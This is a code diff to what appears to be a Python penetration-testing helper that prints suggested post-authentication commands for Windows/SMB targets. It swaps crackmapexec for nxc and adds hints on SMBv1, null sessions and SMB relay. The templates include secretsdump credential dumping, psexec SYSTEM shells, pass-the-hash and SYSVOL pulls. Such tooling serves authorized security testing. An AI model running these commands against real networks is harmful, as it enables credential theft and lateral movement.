@@ -310,8 +310,8 @@ def build_suggestions(s: Success, ip: str, hostname: str,
     if s.auth_type == AuthType.PASSWORD:
         if proto == "smb":
             if is_dc:
-                e += [("crackmapexec --shares",
-                           f"crackmapexec smb {qip} -u {quser} -p {qpw} --shares"),
+                e += [("nxc --shares",
+                           f"nxc smb {qip} -u {quser} -p {qpw} --shares"),
                       ("secretsdump -just-dc",
                            f"impacket-secretsdump -just-dc {qurl_pw}"),
                       ("smbclient (interactive)",
@@ -319,8 +319,8 @@ def build_suggestions(s: Success, ip: str, hostname: str,
             else:
                 e += [("enum4linux-ng",
                            f"enum4linux-ng -A -u {quser} -p {qpw} {qip}"),
-                      ("crackmapexec --shares",
-                           f"crackmapexec smb {qip} -u {quser} -p {qpw} --shares"),
+                      ("nxc --shares",
+                           f"nxc smb {qip} -u {quser} -p {qpw} --shares"),
                       ("secretsdump (SAM+LSA)",
                            f"impacket-secretsdump {qurl_pw}"),
                       ("psexec (SYSTEM shell)",
@@ -378,15 +378,15 @@ def build_suggestions(s: Success, ip: str, hostname: str,
         ha = q(pth_hash) if pth_hash else "NT"
         if proto == "smb":
             if is_dc:
-                e += [("crackmapexec --shares [PtH]",
-                           f"crackmapexec smb {qip} -u {quser} -H {qhash} --shares"),
+                e += [("nxc --shares [PtH]",
+                           f"nxc smb {qip} -u {quser} -H {qhash} --shares"),
                       ("secretsdump -just-dc [PtH]",
                            f"impacket-secretsdump -just-dc {qurl_nopw} -hashes :{ha}"),
                       ("psexec [PtH]",
                            f"impacket-psexec {qurl_nopw} -hashes :{ha}")]
             else:
-                e += [("crackmapexec --shares [PtH]",
-                           f"crackmapexec smb {qip} -u {quser} -H {qhash} --shares"),
+                e += [("nxc --shares [PtH]",
+                           f"nxc smb {qip} -u {quser} -H {qhash} --shares"),
                       ("secretsdump [PtH]",
                            f"impacket-secretsdump {qurl_nopw} -hashes :{ha}"),
                       ("psexec [PtH]",
@@ -512,6 +512,24 @@ def print_target_block(result: TargetResult, extra_hash: str|None,
             for port, hint in hints:
                 print(f"      {ORANGE}# {port}{RESET}  {hint.replace('{ip}', ip)}", flush=True)
         print(flush=True)
+
+    # ── notable config flags (worth investigating — NOT auto-vulns) ─────
+    info = result.target_info or ""
+    notes = []
+    if "SMBv1:True" in info:
+        notes.append(("SMBv1 enabled (legacy)",
+                      f"check MS17-010: nxc smb {ip} -M ms17-010  (verify before trusting)"))
+    if "Null Auth:True" in info:
+        notes.append(("null-session allowed",
+                      f"enum without creds: nxc smb {ip} -u '' -p '' --shares --users --rid-brute"))
+    if "signing:False" in info:
+        notes.append(("SMB signing not required",
+                      "relay candidate: ntlmrelayx with a coercion (PetitPotam/printerbug)"))
+    if notes:
+        print(f"  {YELLOW}[!]{RESET} notable (investigate — not proven vulnerable):", flush=True)
+        for what, how in notes:
+            print(f"      {YELLOW}# {what}{RESET}  {how}", flush=True)
+        print(flush=True)
     else:
         proto = (result.open_protocols[0] if result.open_protocols else "smb").upper()
         port  = PROTOCOL_PORTS.get(result.open_protocols[0]
@@ -581,7 +599,7 @@ def print_target_block(result: TargetResult, extra_hash: str|None,
             ("list shares",           f"smbclient -L //{ip} -N"),
             ("connect to a share",    f"smbclient //{ip}/<SHARE> -N"),
             ("enum4linux-ng",         f"enum4linux-ng -A {ip}"),
-            ("crackmapexec shares",   f"crackmapexec smb {ip} -u '' -p '' --shares"),
+            ("nxc shares",   f"nxc smb {ip} -u '' -p '' --shares"),
             ("recursive pull SYSVOL", f"smbclient //{ip}/SYSVOL -N -c "
                                       f"'recurse ON; prompt OFF; mget *'"),
         ]:
@@ -1500,7 +1518,7 @@ class Nxc3:
                     "# ── anonymous SMB ─────────────────────────────",
                     f"smbclient -L //{ip} -N",
                     f"enum4linux-ng -A {ip}",
-                    f"crackmapexec smb {ip} -u '' -p '' --shares",
+                    f"nxc smb {ip} -u '' -p '' --shares",
                     "",
                 ]
             for s in sorted(r.successes, key=lambda x: (ALL_PROTOCOLS.index(x.protocol)
